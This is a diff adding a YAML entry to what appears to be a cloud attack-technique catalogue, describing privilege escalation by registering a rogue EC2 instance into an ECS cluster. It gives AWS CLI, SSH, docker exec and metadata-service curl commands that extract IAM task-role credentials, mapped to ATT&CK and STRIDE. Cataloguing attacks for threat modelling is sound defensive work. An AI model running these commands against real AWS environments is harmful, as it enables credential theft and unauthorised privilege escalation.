@@ -1,0 +1,66 @@
+attack:
+  id: AWS-ECS-001
+  name: Privilege Escalation via ECS Cluster Registration
+  overview: |
+    This attack leverages EC2 and ECS permissions to achieve privilege escalation by creating a malicious EC2 instance and registering it within an existing ECS cluster. Once registered, ECS services and tasks are scheduled to run on the attacker-controlled EC2 instance as Docker containers. The attacker can then access these containers, extract their IAM role credentials from the instance metadata service, and assume more privileged ECS task roles to escalate privileges within the AWS environment.
+  steps:
+    - title: Create Malicious EC2 Instance with ECS Configuration
+      command: |
+        aws ec2 run-instances \
+            --image-id ami-07fde2ae86109a2af \
+            --instance-type t2.micro \
+            --iam-instance-profile <ECS_role> \
+            --count 1 --key-name pwned \
+            --user-data "file:///tmp/asd.sh"
+        
+        # User data script content (/tmp/asd.sh):
+        #!/bin/bash
+        echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
+      dependencies:
+        - ec2:RunInstances permission
+        - iam:PassRole permission for ECS instance profile
+        - Valid ECS-optimized AMI (e.g., amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
+        - Existing SSH key pair for EC2 access
+        - Knowledge of target ECS cluster name
+        - IAM instance profile with basic ECS permissions (ecs:RegisterContainerInstance, ecs:DiscoverPollEndpoint, etc.)
+      result: |
+        An attacker-controlled EC2 instance is launched and automatically registers itself with the target ECS cluster through the user-data script. The instance appears as a legitimate container instance within the cluster, ready to receive task assignments from ECS services.
+      ttp: T1078.004 - Valid Accounts: Cloud Accounts
+    - title: Wait for ECS Tasks to be Scheduled on Compromised Instance
+      command: |
+        # SSH into the compromised EC2 instance
+        ssh -i pwned.pem ec2-user@<instance-ip>
+        
+        # Monitor for running containers
+        docker ps
+        
+        # List ECS tasks running on the instance
+        aws ecs list-tasks --cluster <cluster-name>
+      dependencies:
+        - SSH access to compromised EC2 instance
+        - ECS scheduler to assign tasks to the malicious instance
+        - Active ECS services or tasks in the target cluster
+      result: |
+        ECS services begin scheduling tasks and containers onto the attacker-controlled EC2 instance. The attacker gains visibility into running containers and can identify high-value targets with privileged IAM roles attached to their task definitions.
+      ttp: T1526 - Cloud Service Discovery
+    - title: Extract IAM Credentials from ECS Task Containers
+      command: |
+        # Access running container
+        docker exec -it <container-id> /bin/bash
+        
+        # Extract IAM role credentials from container metadata
+        curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+        
+        # Or from EC2 instance metadata service
+        TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+        curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
+      dependencies:
+        - Docker access on compromised EC2 instance
+        - Running ECS tasks with IAM roles attached
+        - Network access to instance metadata service (169.254.169.254 or 169.254.170.2)
+      result: |
+        The attacker successfully extracts temporary IAM credentials (AccessKeyId, SecretAccessKey, SessionToken) from ECS task containers. These credentials belong to the IAM roles attached to the ECS tasks, which typically have elevated permissions to access AWS services like S3, DynamoDB, RDS, or Secrets Manager. The attacker can now use these stolen credentials to access sensitive resources and achieve privilege escalation.
+      ttp: T1552.005 - Unsecured Credentials: Cloud Instance Metadata API
+  stride_goal:
+    - Elevation of Privilege
+    - Information Disclosure
